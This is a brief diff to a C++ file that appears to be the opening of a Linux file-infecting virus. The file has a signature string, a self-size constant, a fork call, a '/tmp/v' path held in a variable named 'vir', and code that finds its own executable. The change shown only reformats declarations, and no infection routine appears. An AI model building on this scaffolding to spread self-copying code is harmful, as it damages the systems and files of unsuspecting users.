@@ -2,18 +2,16 @@
 #include <fstream>
 #include <unistd.h>
 
+using std::string; using std::ifstream; using std::ofstream;
+
 const char* IDENTIFIER = "XAUVCUGCEIFS";
 const int MYSIZE = 19576;
-
-using std::string;
-using std::ifstream;
-using std::ofstream;
 
 char* which(char* w);
 
 int main (int argc, char** argv) {
     pid_t childpid = fork();
-    uid_t uid=getuid();
+    uid_t uid = getuid();
     srand(time(0));
     int c;
     string exe = "/tmp/e", vir = "/tmp/v", me = (string) which(argv[0]), command;
